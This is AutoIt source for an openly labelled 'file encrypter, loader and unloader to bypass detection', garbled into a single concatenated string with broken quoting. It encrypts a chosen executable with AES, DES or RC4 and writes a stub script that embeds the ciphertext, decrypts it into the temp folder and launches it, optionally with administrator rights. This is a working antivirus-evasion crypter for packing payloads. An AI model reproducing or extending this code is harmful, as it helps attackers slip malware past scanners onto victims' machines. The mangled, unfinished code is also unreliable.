Local $chunk =' & @crlf & ';Trick of the trade -- Encrypted file loader and unloader to bypass detection.' & @crlf & ';   Written by TRAGENALPHA' & @crlf & ';   12:19PM -- 26/12/2017' & @crlf & '; The 'cryptlib.au3' file is a combination of FileConstants.au3 and Crypt.au3' & @crlf & ';TODO : check if the variable that is handling the encryption works : debug code @ 267 // continue there ' & @crlf & ';TODO : AutoIt can only handle 4000 > char in lines make sure given key length doesn't exceed or use _ to create continuation.' & @crlf & '#NoTrayIcon' & @crlf & '#include <lib\cryptlib.au3>' & @crlf & '#include <lib\consolemodify.au3>' & @crlf & '#include <lib\createkey.au3>' & @crlf & '#include <MsgBoxConstants.au3>' & @crlf & 'Global $bnum = "0001"' & @crlf & 'Global $envargs' & @crlf & 'Global $argfilein = ""' & @crlf & 'Global $argfileout = ""' & @crlf & 'Global $argarch = "x86"' & @crlf & 'Global $argencrypt = $CALG_AES_128' & @crlf & 'Global $argico = ""' & @crlf & 'Global $genkey' & @crlf & 'Global $execflnm' & @crlf & 'Global $reqadmn = false' & @crlf & 'Global $tmpdir = @TempDir & "\tott"' & @crlf & 'coutl("/----------------\ -----------------------------------------------")' & @crlf & 'coutl("|     /\  /\     | Tricks of the Trade b#" & $bnum)' & @crlf & 'coutl("|   _/  \/  \_   |   File encrypter, loader and")' & @crlf & 'coutl("|  // _\ /_  \\  |   unloader to bypass detection.")' & @crlf & 'coutl("| / \ *   *  / \ | -----------------------------------------------")' & @crlf & 'coutl("| \  \  ^   /  / | https://github.com/tragenalpha/tricksofthetrade")' & @crlf & 'coutl("|6_\_ \..../ _/_6| -----------------------------------------------")' & @crlf & 'coutl("| \ .\|.\/.|/. / |                   (c) <bear>Softwares</trap>")' & @crlf & 'coutl("\----------------/ -----------------------------------------------")' & @crlf & 'If $Cmdline[0] = 0 Then' & @crlf & '  coutl("Please run the program in a command line supplied with arguments and it's respective parameters")' & @crlf & '  coutl("Use the --help to show the help dialogue")' & @crlf & '  error("supplied argument is 0")' & @crlf & 'ElseIf $Cmdline[1] = "--help" Then' & @crlf & '  coutl("Tricks of the Trade build # " & $bnum & " // Developed by: TRAGENALPHA // [beartrap]")' & @crlf & '  coutl("tragenalpha@protonmail.com ## https://tragenalpha.github.io")' & @crlf & '  coutl("")' & @crlf & '  coutl("Encrypts your binary file and embeds them to an executable to bypass detection.")' & @crlf & '  coutl(" *Arguments that are given to the carrier are passed to the embedded executable")' & @crlf & '  coutl(" *This will not guarantee a FUD / bypass. The original executable is fully untouched and is later")' & @crlf & '  coutl(" dropped and executed. This will mostly be useful to bypass online / network scanners")' & @crlf & '  coutl(" *Only executable binaries is allowed to be imported (*.exe)")' & @crlf & '  coutl(" *Decrypted executable is dropped in the common temporary folder")' & @crlf & '  coutl(" *software comes bundled with aghanim's scepter provided by a weird pink midget")' & @crlf & '  coutl("")' & @crlf & '  coutl("Usage: tott.exe [mode] -e [encryption] -a [architecture] -ico [file] -i [file in] -o [file out] -kl [integer] -requireadmin")' & @crlf & '  coutl(" * [mode] should always be the first argument given")' & @crlf & '  coutl("")' & @crlf & '  coutl("[mode] :: Sets the mode of the application")' & @crlf & '  coutl("--help :: shows the help dialogue")' & @crlf & '  coutl("--load  :: Encrypt and load a file ")' & @crlf & '  coutl("--cleanup :: clear up space by deleting all the temporary files")' & @crlf & '  coutl("")' & @crlf & '  coutl("[load arguments]")' & @crlf & '  coutl("-i [file in] :: File path of the file to be loaded and encrypted")' & @crlf & '  coutl("-e [encryption] :: Encryption to use :: 3des, aes128, aes192, aes256, des, rc2, rc4 :: Default encryption aes128")' & @crlf & '  coutl("-o [file out] :: File output destination after encryption and file load process")' & @crlf & '  coutl("-a [architecture] :: Compiled executable architecture :: x86, x64 :: Default architecture x86")' & @crlf & '  coutl("-ico [file] :: Compiled executable icon :: Default icon [blank icon]")' & @crlf & '  coutl("-kl [integer] :: Key length to be used for the encryption :: Default length 64")' & @crlf & '  coutl("-requireadmin :: Flags the compiled application to require administrative priviledges")' & @crlf & '  Exit' & @crlf & 'ElseIf $Cmdline[1] = "--load" Then' & @crlf & '  If $Cmdline[0] = 1 Then error("insufficient arguments")' & @crlf & '  $envargs = $Cmdline[2]' & @crlf & '  For $i = 3 to $Cmdline[0]' & @crlf & '    $envargs = $envargs & " " & $Cmdline[$i]' & @crlf & '  Next' & @crlf & '  ' & @crlf & '  coutw("Checking for temporary directory... ")' & @crlf & '  If FileExists($tmpdir) Then' & @crlf & '    coutl("OK!")' & @crlf & '  Else' & @crlf & '    coutw("Creating... ")' & @crlf & '    If DirCreate($tmpdir) Then' & @crlf & '      coutl("DONE!")' & @crlf & '    Else' & @crlf & '      coutl("FAILED!")' & @crlf & '      error("cannot create temporary folder")' & @crlf & '    EndIf' & @crlf & '  EndIf' & @crlf & '  coutw("Checking for compiler... ")' & @crlf & '  If FileExists($tmpdir & "\aicompiler.exe") Then' & @crlf & '    coutl("OK!")' & @crlf & '  Else' & @crlf & '    coutw("Dropping... ")' & @crlf & '    If FileInstall("C:\Program Files (x86)\AutoIt3\Aut2Exe\Aut2exe.exe", $tmpdir & "\aicompiler.exe") Then' & @crlf & '      coutl("DONE!")' & @crlf & '    Else' & @crlf & '      coutl("FAILED!")' & @crlf & '      error("cannot drop compiler")' & @crlf & '    EndIf' & @crlf & '  EndIf' & @crlf & '  coutw("Checking for compressor... ")' & @crlf & '  If FileExists($tmpdir & "\upx.exe") Then' & @crlf & '    coutl("OK!")' & @crlf & '  Else' & @crlf & '    coutw("Dropping... ")' & @crlf & '    If FileInstall("C:\Program Files (x86)\AutoIt3\Aut2Exe\upx.exe", $tmpdir & "\upx.exe") Then' & @crlf & '      coutl("DONE!")' & @crlf & '    Else' & @crlf & '      coutl("FAILED!")' & @crlf & '      error("cannot drop compressor")' & @crlf & '    EndIf' & @crlf & '  EndIf' & @crlf & '  coutw("Checking crypto library... ")' & @crlf & '  If FileExists($tmpdir & "\Include\cryptlib.au3") Then' & @crlf & '    coutl("OK!")' & @crlf & '  Else' & @crlf & '    coutw("Dropping... ")' & @crlf & '    DirCreate($tmpdir & "\Include")' & @crlf & '    If FileInstall("lib\cryptlib.au3", $tmpdir & "\Include\cryptlib.au3") Then' & @crlf & '      coutl("DONE!")' & @crlf & '    Else' & @crlf & '      coutl("FAILED!")' & @crlf & '      error("cannot drop cryplib")' & @crlf & '    EndIf' & @crlf & '  EndIf' & @crlf & '  Call("initializeargs")' & @crlf & 'ElseIf $Cmdline[1] = "--cleanup" Then' & @crlf & '  Call("cleanup")' & @crlf & 'Else' & @crlf & '  error("invalid mode")' & @crlf & 'EndIf' & @crlf & 'Func initializeargs()' & @crlf & '  coutl("Initializing arguments... :: " & $envargs)' & @crlf & '  For $bdvty in StringSplit($envargs, "-", 2)' & @crlf & '    If $bdvty = "" = False Then' & @crlf & '      Local $gsvrt = StringSplit($bdvty, " ", 2)' & @crlf & '      Switch ($gsvrt[0])' & @crlf & '      Case "i"' & @crlf & '        If UBound($gsvrt) <= 1 Then error("insufficient parameter")' & @crlf & '        coutw("arg::in::" & $gsvrt[1] & "::")' & @crlf & '        If FileExists($gsvrt[1]) and StringRight($gsvrt[1], 4) = ".exe" Then' & @crlf & '          $argfilein = $gsvrt[1]' & @crlf & '          Local $sbys = StringSplit($gsvrt[1], "\", 2)' & @crlf & '          $execflnm = StringTrimRight($sbys[UBound($sbys) - 1], 4)' & @crlf & '          coutl("OK!")' & @crlf & '        Else' & @crlf & '          coutl("ERROR!")' & @crlf & '          error("file does not exist or is not a binary")' & @crlf & '        EndIf' & @crlf & '      Case "e"' & @crlf & '        If UBound($gsvrt) <= 1 Then error("insufficient parameter")' & @crlf & '        coutw("arg::encryption::" & $gsvrt[1] & "::")' & @crlf & '        If $gsvrt[1] = "3des" or $gsvrt[1] = "aes128" or $gsvrt[1] = "aes192" or $gsvrt[1] = "aes256" or $gsvrt[1] = "des" or $gsvrt[1] = "rc2" or $gsvrt[1] = "rc4" Then' & @crlf & '          coutl("OK!")' & @crlf & '          Switch($gsvrt[1])' & @crlf & '            Case "3des"' & @crlf & '              $argencrypt = $CALG_3DES' & @crlf & '            Case "aes128"' & @crlf & '              $argencrypt = $CALG_AES_128' & @crlf & '            Case "aes192"' & @crlf & '              $argencrypt = $CALG_AES_192' & @crlf & '            Case "aes256"' & @crlf & '              $argencrypt = $CALG_AES_256' & @crlf & '            Case "des"' & @crlf & '              $argencrypt = $CALG_DES' & @crlf & '            Case "rc2"' & @crlf & '              $argencrypt = $CALG_RC2' & @crlf & '            Case "rc4"' & @crlf & '              $argencrypt = $CALG_RC4' & @crlf & '          EndSwitch' & @crlf & '        Else' & @crlf & '          coutl("ERROR!")' & @crlf & '          error("unknown encryption type")' & @crlf & '        EndIf' & @crlf & '      Case "o"' & @crlf & '        If UBound($gsvrt) <= 1 Then error("insufficient parameter")' & @crlf & '        coutw("arg::out::" & $gsvrt[1] & "::")' & @crlf & '        If FileExists($gsvrt[1]) = False Then' & @crlf & '          $argfileout = $gsvrt[1]' & @crlf & '          coutl("OK!")' & @crlf & '        Else' & @crlf & '          coutl("ERROR!")' & @crlf & '          error("out file name already exists")' & @crlf & '        EndIf' & @crlf & '      Case "a"' & @crlf & '        If UBound($gsvrt) <= 1 Then error("insufficient parameter")' & @crlf & '        coutw("arg::architecture::" & $gsvrt[1] & "::")' & @crlf & '         If $gsvrt[1] = "x86" or $gsvrt[1] = "x64" Then' & @crlf & '          $argarch = $gsvrt[1]' & @crlf & '          coutl("OK!")' & @crlf & '        Else' & @crlf & '          coutl("ERROR!")' & @crlf & '          error("unknown architecture type")' & @crlf & '        EndIf' & @crlf & '      Case "ico"' & @crlf & '        If UBound($gsvrt) <= 1 Then error("insufficient parameter")' & @crlf & '        coutw("arg::icon::" & $gsvrt[1] & "::")' & @crlf & '        If FileExists($gsvrt[1]) and StringRight($gsvrt[1], 4) = ".ico" Then' & @crlf & '          $argico = $gsvrt[1]' & @crlf & '          coutl("OK!")' & @crlf & '        Else' & @crlf & '          coutl("ERROR!")' & @crlf & '          error("file does not exists or is not an image/graphic")' & @crlf & '        EndIf' & @crlf & '      Case "kl"' & @crlf & '        stgenkey($gsvrt[1])' & @crlf & '      Case "requireadmin"' & @crlf & '        $reqadmn = true' & @crlf & '        coutl("requireadmin::flag::true")' & @crlf & '      Case Else' & @crlf & '        error('supplied argument:' & $gsvrt[0])' & @crlf & '      EndSwitch' & @crlf & '    EndIf' & @crlf & '  Next' & @crlf & '  If $genkey = "" Then' & @crlf & '    coutl("Generating key with length of 64...")' & @crlf & '    stgenkey(64)' & @crlf & '  EndIf' & @crlf & '  coutw("Validating... ")' & @crlf & '  If $argfilein = "" and $argfileout = "" Then' & @crlf & '    coutl("ERROR!")' & @crlf & '    error("-i and -o aren't optional argument and should be supplied")' & @crlf & '  Else' & @crlf & '    coutl("OK!")' & @crlf & '    Call("phase1")' & @crlf & '  EndIf' & @crlf & 'EndFunc' & @crlf & 'Func phase1()' & @crlf & '  coutw("Copying input file... ")' & @crlf & '  If FileCopy($argfilein, $tmpdir & "\$tmp.exe", 1) Then' & @crlf & '    coutl("DONE!")' & @crlf & '  Else' & @crlf & '    coutl("FAILED!")' & @crlf & '    error("failed to copy file")' & @crlf & '  EndIf' & @crlf & '  If $argico = "" = False Then' & @crlf & '    coutw("Copying icon... ")' & @crlf & '    If FileCopy($argico, $tmpdir & "\$tmp.ico", 1) Then' & @crlf & '      coutl("DONE!")' & @crlf & '    Else' & @crlf & '      coutl("FAILED!")' & @crlf & '      error("failed to copy file")' & @crlf & '    EndIf' & @crlf & '  EndIf' & @crlf & '  coutw("Encrypting binary... ")' & @crlf & '  If _Crypt_EncryptFile($tmpdir & "\$tmp.exe", $tmpdir & "\$tmp._tot", $genkey, $argencrypt) Then' & @crlf & '    coutl("Done!")' & @crlf & '  Else' & @crlf & '    coutl("Failed!")' & @crlf & '    error("cannot encrypt binary file")' & @crlf & '  EndIf' & @crlf & '  coutw("Writing script... ")' & @crlf & '  Local $chunk' & @crlf & '  $chunk = '#NoTrayIcon' & @crlf & '#include <cryptlib.au3>' & @crlf & 'Global $filename = "' & $execflnm & '"' & @crlf & 'Global $finalargs = ""' & @crlf & 'Global $key = "' & $genkey & '"' & @crlf & 'Global $algo = ' & $argencrypt & @crlf & 'If $Cmdline[0] > 0 Then' & @crlf & 'For $i = 1 to Ubound($Cmdline) - 1' & @crlf & 'If $finalargs = "" Then' & @crlf & '$finalargs = $Cmdline[1]' & @crlf & 'Else' & @crlf & '$finalargs &= " " & $Cmdline[$i]' & @crlf & 'EndIf' & @crlf & 'Next' & @crlf & 'EndIf' & @crlf & 'If FileExists(@TempDir & "\" & $filename & ".exe") = False Then' & @crlf & 'FileInstall("$tmp._tot", @TempDir & "\" & $filename & "._tot", 1)' & @crlf & '_Crypt_DecryptFile(@TempDir & "\" & $filename & "._tot", @TempDir & "\" & $filename & ".exe", $key, $algo)' & @crlf & 'execfile()' & @crlf & 'Else' & @crlf & 'execfile()' & @crlf & 'EndIf' & @crlf & 'Func execfile()' & @crlf & 'ShellExecute(@TempDir & "\" & $filename & ".exe", $finalargs)' & @crlf & 'EndFunc'' & @crlf & '  If $reqadmn Then $chunk = "#RequireAdmin" & @crlf & $chunk' & @crlf & '  coutw("Creating file handler... ")' & @crlf & '  Local $sdgvsr = FileOpen($tmpdir & "\payload.au3", 2)' & @crlf & '  If $sdgvsr = -1 Then' & @crlf & '    coutl("FAILED!")' & @crlf & '    error("cannot create file handler")' & @crlf & '  EndIf' & @crlf & '  coutw("Writing to handler... ")' & @crlf & '  If FileWrite($sdgvsr, $chunk) Then' & @crlf & '    coutw("Closing handler... ")' & @crlf & '    If FileClose($sdgvsr) Then' & @crlf & '      coutl("DONE!")' & @crlf & '    Else' & @crlf & '      coutl("FAILED!")' & @crlf & '      error("failed to close file handler")' & @crlf & '    EndIf' & @crlf & '  Else' & @crlf & '    coutl("FAILED!")' & @crlf & '    error("cannot write data to handler")' & @crlf & '  EndIf' & @crlf & '  coutw("Compiling...")' & @crlf & '  Local $comarg = '/in "payload.au3"' & '" /out "' & $argfileout & '" /comp 4 /pack'' & @crlf & '  If $argico = "" = False Then $comarg &= ' /ico "' & $argico & '"'' & @crlf & '  MsgBox(0, '', $comarg)' & @crlf & 'EndFunc' & @crlf & 'Func stgenkey($length)' & @crlf & '  coutw("Generating key::length::" & $length & "::")' & @crlf & '  If $length >= 8 Then' & @crlf & '    $genkey = createkey($length)' & @crlf & '    coutl("Done!")' & @crlf & '    coutl("-----")' & @crlf & '    coutl($genkey)' & @crlf & '    coutl("-----")' & @crlf & '  Else' & @crlf & '    coutl("ERROR!")' & @crlf & '    error("-kl parameter is not a number or below 8")' & @crlf & '  EndIf' & @crlf & 'EndFunc' & @crlf & 'Func cleanup()' & @crlf & '  coutw("Cleaning up... ")' & @crlf & '  If FileExists($tmpdir) Then' & @crlf & '    If DirRemove($tmpdir, 1) Then' & @crlf & '      coutl("Done!")' & @crlf & '    Else' & @crlf & '      coutl("Failed!")' & @crlf & '      error("cannot delete temporary directory")' & @crlf & '    EndIf' & @crlf & '  Else' & @crlf & '    coutl("ERROR!")' & @crlf & '    error("nothing to clean")' & @crlf & '  EndIf' & @crlf & 'EndFunc